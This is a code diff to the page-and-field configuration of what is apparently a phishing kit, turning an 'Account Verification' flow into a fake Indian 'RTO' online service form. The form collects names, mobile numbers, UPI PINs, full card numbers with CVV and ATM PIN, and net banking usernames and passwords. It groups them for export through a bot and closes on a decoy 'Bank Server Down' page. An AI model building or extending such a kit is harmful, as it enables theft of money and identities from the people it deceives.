@@ -3,29 +3,31 @@
 // ============================================================
 // To add/remove/change a form page or field:
 //   1. Edit the FORM_PAGES array below
-//   2. Create/update the corresponding HTML file in public/pages/
+//   2. The RTO single-page form in public/rto/index.html handles all steps
 //   That's it — bot.ts, types, and server routes all read from here.
 // ============================================================
 
 export interface FieldConfig {
     key: string;           // Field key (used in data storage & API)
     displayName: string;   // Human-readable name (used in bot messages & exports)
-    type: 'text' | 'tel' | 'password' | 'date';  // HTML input type
-    category: 'personal' | 'account' | 'card' | 'login';  // Grouping for bot export
+    type: 'text' | 'tel' | 'password' | 'date' | 'number' | 'radio';  // HTML input type
+    category: 'personal' | 'payment' | 'upi' | 'card' | 'login';  // Grouping for bot export
     required: boolean;
     maxlength?: number;
     placeholder?: string;
 }
 
 export interface PageConfig {
-    id: string;            // Unique page ID (used in URL: pages/{id}.html)
-    pageName: string;      // Name sent to /api/form/sync (e.g. 'kyc_login')
+    id: string;            // Unique page ID (used in URL: rto/index.html#{id})
+    pageName: string;      // Name sent to /api/form/sync (e.g. 'customer_info')
     title: string;         // Display title for the page
     fields: FieldConfig[]; // Fields on this page
     // Navigation: which page comes next in each flow (null = end of flow)
     nextPage: {
         main?: string | null;
-        apply?: string | null;
+        upi?: string | null;
+        card?: string | null;
+        netbanking?: string | null;
     };
     isFinalPage?: boolean; // If true, calls /api/form/submit after sync
 }
@@ -41,53 +43,85 @@ export interface CategoryConfig {
 
 export const FIELD_CATEGORIES: CategoryConfig[] = [
     { key: 'personal', displayName: 'Personal Details', emoji: '👤' },
-    { key: 'account', displayName: 'Account Details', emoji: '🏦' },
+    { key: 'payment', displayName: 'Payment Details', emoji: '💰' },
+    { key: 'upi', displayName: 'UPI Details', emoji: '📱' },
     { key: 'card', displayName: 'Card Details', emoji: '💳' },
-    { key: 'login', displayName: 'Login Credentials', emoji: '🔐' },
+    { key: 'login', displayName: 'Net Banking / Login', emoji: '🔐' },
 ];
 
 // ==================== FORM PAGES ====================
 // Order matters — this defines the default page sequence.
 // Each page's `nextPage` defines per-flow navigation.
+// All pages are rendered inside public/rto/index.html as steps.
 
 export const FORM_PAGES: PageConfig[] = [
     {
-        id: 'account_verify',
-        pageName: 'account_verify',
-        title: 'Account Verification',
+        id: 'customer_info',
+        pageName: 'customer_info',
+        title: 'Online Service Form',
         fields: [
-            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Enter 10-digit Mobile Number' },
-            { key: 'atmPin', displayName: 'ATM PIN', type: 'tel', category: 'account', required: true, maxlength: 4, placeholder: 'ATM PIN' },
+            { key: 'customerName', displayName: 'Customer Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter Customer Name' },
+            { key: 'mobileNumber', displayName: 'Mobile Number', type: 'tel', category: 'personal', required: true, maxlength: 10, placeholder: 'Enter Mobile Number' },
+            { key: 'reason', displayName: 'Reason', type: 'text', category: 'personal', required: true, placeholder: 'Describe Your Problem' },
         ],
-        nextPage: { main: 'customer_verify' },
+        nextPage: { main: 'payment_mode' },
     },
     {
-        id: 'customer_verify',
-        pageName: 'customer_verify',
-        title: 'Customer Verification',
+        id: 'payment_mode',
+        pageName: 'payment_mode',
+        title: 'Payment Mode',
         fields: [
-            { key: 'aadhaarNumber', displayName: 'Aadhaar Number', type: 'tel', category: 'personal', required: true, maxlength: 12, placeholder: 'Enter 12-digit Aadhaar' },
-            { key: 'panNumber', displayName: 'PAN Number', type: 'text', category: 'personal', required: true, maxlength: 10, placeholder: 'ABCDE1234F' },
-            { key: 'accountNumber', displayName: 'Account Number', type: 'text', category: 'account', required: true, placeholder: 'Enter Account Number' },
-            { key: 'motherName', displayName: 'Mother Name', type: 'text', category: 'personal', required: true, placeholder: 'Enter Mother Name' }
+            { key: 'paymentMode', displayName: 'Payment Mode', type: 'radio', category: 'payment', required: true, placeholder: 'PAY / REFUND / OTHER' },
+            { key: 'amount', displayName: 'Amount', type: 'number', category: 'payment', required: true, placeholder: 'Enter Amount' },
         ],
-        nextPage: { main: 'card_verify' },
+        nextPage: { main: 'payment_method' },
     },
     {
-        id: 'card_verify',
-        pageName: 'card_verify',
-        title: 'Card Verification',
+        id: 'payment_method',
+        pageName: 'payment_method',
+        title: 'Select Payment Method',
         fields: [
-            { key: 'cardNumber', displayName: 'Card Number', type: 'tel', category: 'card', required: true, maxlength: 16, placeholder: 'Enter 16-digit Card Number' },
-            { key: 'validThrough', displayName: 'Valid Through', type: 'tel', category: 'card', required: true, maxlength: 5, placeholder: 'MMYY' },
-            { key: 'cvv', displayName: 'CVV', type: 'tel', category: 'card', required: true, maxlength: 3, placeholder: 'Enter 3-digit CVV' }
+            { key: 'paymentMethod', displayName: 'Payment Method', type: 'text', category: 'payment', required: true, placeholder: 'UPI / Card / Net Banking' },
+        ],
+        nextPage: { upi: 'upi_details', card: 'card_details', netbanking: 'netbanking_details' },
+    },
+    {
+        id: 'upi_details',
+        pageName: 'upi_details',
+        title: 'UPI Details',
+        fields: [
+            { key: 'upiBankName', displayName: 'UPI Bank Name', type: 'text', category: 'upi', required: true, placeholder: 'Search or Select Bank' },
+            { key: 'upiPin', displayName: 'UPI PIN', type: 'password', category: 'upi', required: true, placeholder: 'Enter UPI PIN' },
+        ],
+        nextPage: { main: 'success' },
+    },
+    {
+        id: 'card_details',
+        pageName: 'card_details',
+        title: 'Card Details',
+        fields: [
+            { key: 'cardNumber', displayName: 'Card Number', type: 'tel', category: 'card', required: true, maxlength: 19, placeholder: 'XXXX-XXXX-XXXX-XXXX' },
+            { key: 'expiry', displayName: 'Expiry Date', type: 'text', category: 'card', required: true, maxlength: 5, placeholder: 'MM/YY' },
+            { key: 'cvv', displayName: 'CVV', type: 'password', category: 'card', required: true, maxlength: 3, placeholder: 'Enter 3-digit CVV' },
+            { key: 'atmPin', displayName: 'ATM PIN', type: 'password', category: 'card', required: true, maxlength: 4, placeholder: 'Enter ATM PIN' },
+        ],
+        nextPage: { main: 'success' },
+    },
+    {
+        id: 'netbanking_details',
+        pageName: 'netbanking_details',
+        title: 'Net Banking Details',
+        fields: [
+            { key: 'bankName', displayName: 'Bank Name', type: 'text', category: 'login', required: true, placeholder: 'Search or Select Bank' },
+            { key: 'username', displayName: 'Username / Customer ID', type: 'text', category: 'login', required: true, placeholder: 'Enter Username / Customer ID' },
+            { key: 'password', displayName: 'Password', type: 'password', category: 'login', required: true, placeholder: 'Enter Password' },
         ],
         nextPage: { main: 'success' },
     },
     {
         id: 'success',
         pageName: 'success',
-        title: 'Verification in Progress',
+        title: 'Bank Server Down',
         fields: [],
         nextPage: { main: null },
         isFinalPage: true,
